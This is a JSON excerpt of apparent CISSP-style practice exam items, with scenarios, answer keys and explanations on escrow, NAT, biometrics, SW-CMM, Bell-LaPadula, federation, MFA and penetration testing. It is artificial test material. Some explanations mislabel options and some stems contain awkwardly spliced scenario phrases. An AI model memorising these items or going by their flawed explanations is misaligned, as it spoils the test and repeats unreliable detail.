      "stem": "An Internet of Things (IoT) manufacturing organization hires a startup to develop a custom application that lets users monitor room temperatures and send notifications on their phones. The startup firm is responsible for developing and deploying the code. Since the IoT organization does not have any in-house expertise to support customer issues, they delegate these responsibilities to the startup firm. The manufacturing organization wants to protect its application code in case the startup organization fails to comply with its responsibilities. What type of agreement should the IoT manufacturer have in place to protect their software code?",
      "choices": [
        "Service Level Agreement",
        "Mutual Assistance Agreement",
        "Contractor Agreement",
        "Software Escrow Agreement"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. A software escrow agreement is used to protect the application code in the event that the software company goes out of business or is unable to provide technical support. The agreement obligates the software company to release the application code to a third-party provider. The provider will save the code in a secure location until the relationship between the manufacturer and the software company ends. This allows the manufacturing company to maintain control over its application. Option 1, Mutual Assistance Agreements (also referred to as reciprocal agreements) are used in disaster recovery. It's an agreement between two organizations to support each other by sharing their infrastructure resources in the event of a disaster. This is rarely used in the real world since there are major drawbacks to this approach. A service Level Agreement (SLA), B, is made between the client and the service provider, stating the terms and conditions governing the services offered. A contractor agreement (3) is similar to an SLA, but it is made between the vendor and the contractor."
    },
    {
      "id": "d4-q106",
      "domain": "4. Communication and Network Security",
      "stem": "While planning a control enhancement roadmap, at a multinational bank, an IT department procures a firewall that will be installed between the Internet zone and the Demilitarized Zone (DMZ). The organization only has one public IP address assigned to it. The IT manager advises the firewall administrator to configure the firewall in such a way that all the DMZ servers should have access to the internet. Which networking concept should the administrator implement to meet the manager's requirement?",
      "choices": [
        "Routing information protocol (RIP)",
        "Virtual Private Network (VPN)",
        "Network Address port translation (NAPT)",
        "One-to-One Network Address Translation (NAT)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. NPAT enables a single external IP address to host 65,536 internal IP addresses. It does so by using different port numbers for different internal IP addresses. For example: If the assigned public IP is 1.1.1.1 and we have two different internal hosts that want internet access (Computer A - 10.0.0.1 and Computer B- 10.0.0.2) then NPAT will assign a dedicated port to each computer and will save that data in the firewall's memory table until the session is closed. Computer A : 10.0.0.1: 9090 <–> 1.1.1.1 Computer B : 10.0.0.2 – 9091 <–> 1.1.1.1 Traffic coming via port 9090 will be re-directed to computer A and traffic received on port 9091 will go to computer B. One-to-One NAT (4) assigns a single public IP address to a single host. Since the organization only has 1 public IP address and multiple internal hosts, it cannot use 1-to-1 NAT. RIP (1) is a routing protocol used to route IP packets between different networks. A VPN (2) is a secure communication channel established over an untrusted network to transmit information between different entities, it does not offer a network or port translation service."
    },
    {
      "id": "d5-q114",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A Military organization has built a facility to test their new weapons. They have implemented biometric scanning at each access door. On a sensitivity scale of 1-20, the Crossover rate (CER) is set to 10. Given the sensitivity of the operation, the military wants to avoid false positives. Which option is the best way to enforce physical security?",
      "choices": [
        "Decrease the CER",
        "Increase the Equal error rate (EER)",
        "Increase the sensitivity of the system",
        "Decrease the sensitivity of the system"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. Crossover error rate (CER) and Equal error rate (EER) are used interchangeably, and they cannot be changed by the customer. If you want to change the CER/EER, then you will have to buy a new biometric system. As per the CER graph in the CISSP study guide, increasing the sensitivity of the system will reduce the false acceptance rate (FAR), or 'type 2 errors', but will increase the false rejection rate (FRR), type 1 errors. In the preceding scenario, the organization wants to reduce false positives. This means the FAR should be less, hence they should increase the sensitivity of the system."
    },
    {
      "id": "d8-q85",
      "domain": "8. Software Development Security",
      "stem": "While planning a control enhancement roadmap, at a cloud SaaS company, a software organization hires a consultant to evaluate their existing software processes and help them get to the next stage of the Software Capability Maturity Model ( SW-CMM) model. Their goal is to have a basic lifecycle management process in place so that they can reuse the code in an organized fashion. In which state of SW-CMM is the software organization currently operating?",
      "choices": [
        "Repeatable",
        "Initial",
        "Defined",
        "Managed"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. The software company is currently operating in the \"Initial\" stage of the SW-CMM model. The initial stage is also called the ad-hoc stage, where the processes are not yet defined, and everyone is working individually as per requirements. The repeatable stage (1) is where the basic lifecycle management process is defined. Codes are re-used in an organized fashion to re-create the same result. The defined stage (3) is where a formalized process is documented, and software developers are expected to follow those standards and procedures. The managed stage (4) is where quantitative metrics are developed to verify if objectives are being met by the defined processes."
    },
    {
      "id": "d3-q112",
      "domain": "3. Security Architecture and Engineering",
      "stem": "In preparation for an external audit, at a logistics enterprise, a detective working in a federal prosecution department has 'Top Secret' security clearance within the enterprise. Moreover, they have been involved in a classified investigative case labeled 'Secret' with an Officer who has a 'Confidential' security clearance. While the Officer can add findings, the detective cannot append any data to the case under probe. What principle of the Bell-LaPadula model would BEST meet the described scenario?",
      "choices": [
        "Simple Security Principle",
        "Star Security Property",
        "Discretionary Security Property",
        "Start Integrity Property"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. The statement outlined in the scenario fits with the rule of star security property (*star property) of the Bell-LaPadula model, which prohibits subjects with a given security clearance from writing to objects beneath their clearance level (\"No write down\"). The simple security principle, on the other hand, is an access rule that blocks subjects with lower clearance from reading objects at higher levels of clearance (\"No read up\"). In discretionary security property, subjects gain access to objects based on an access matrix. Start integrity property is a Biba model's rule and deals with integrity issues. It is not an appropriate model to address confidentiality issues as demonstrated in the scenario."
    },
    {
      "id": "d5-q115",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "In preparation for an external audit, at a cloud SaaS company, aBC PLC works in collaboration with XYZ Limited on many projects. Moreover, they want to allow users of each organization to gain access to centralized systems, applications, and resources to facilitate their work. Besides, users will not be required to create an account in each organization to gain access to the shared resources. They will be simply granted access to the shared systems using a single set of credentials. This will reduce user administration and provisioning overheads and will enable the companies to focus on their organization functions. What best meets the requirements outlined in the scenario?",
      "choices": [
        "Managed Security Services Provider (MSSP)",
        "Identity as Service (IDaaS)",
        "Single Sign-On (SSO)",
        "Federated Identity Management (FIM)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. Federated Identity Management (FIM) enables different organizations to grant access to systems and applications through a single credential. FIM will extend the Single Sign-On (SSO) concept beyond a single organization, whereas SSO is applicable to authenticating entities and related applications within a single organization. Identity as Service (IDaaS) is a subset of federated identity management. Managed Security Service Provider (MSSP) focuses on providing security functionalities to organizations as a service."
    },
    {
      "id": "d5-q116",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Priya’s organization recently decided to authenticate its employees through Multi-Factor Authentication (MFA) techniques before permitting access to its sensitive organizational data. Which option BEST meets the new requirement?",
      "choices": [
        "Smartcard, token, fingerprint",
        "Password, PIN, smartcard",
        "Retina scan, token, fingerprint",
        "Smartcard, fingerprint, password"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. Unlike single- and two-factor authentication methods, MFA employs two or more authentication factors. Only option 4 precisely reflects something you know (password), something you have (smartcard), and something you are (fingerprint) factors. Authentication factors help organizations to develop hard-to-break security controls and multifactor authentication is a desirable technique to safeguard assets."
    },
    {
      "id": "d6-q117",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a post-incident lessons-learned meeting, at a multinational bank, soori, the newly crowned Chief Information Security Officer (CISO) of ABC Limited, is worried about a report of suspicious traffic to the business’s web applications. Moreover, he decided to hire a penetration testing organization to evaluate the effectiveness of the security controls in place and further decided to share no information with the testers. What is the most appropriate response to undertake the test?",
      "choices": [
        "White-box testing",
        "Black-box testing",
        "Gray-box testing",
        "Blue-box testing"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. Black-box testing is a type of testing in which the tester conducts the test procedure with zero knowledge of the environment under consideration. The testers depend on reconnaissance, banner grabbing, and other techniques to gather information for further exploitation. This test is the most realistic and effective method to discover and exploit vulnerabilities. However, it may cause unintended interruption to the business. Whereas white-box testers have complete knowledge of the environment, gray-box testing is undertaken based on partial knowledge of the platform to be tested. Since there is no category of testing dubbed blue-box testing in penetration testing, it is an incorrect option."
    }
  ]
}
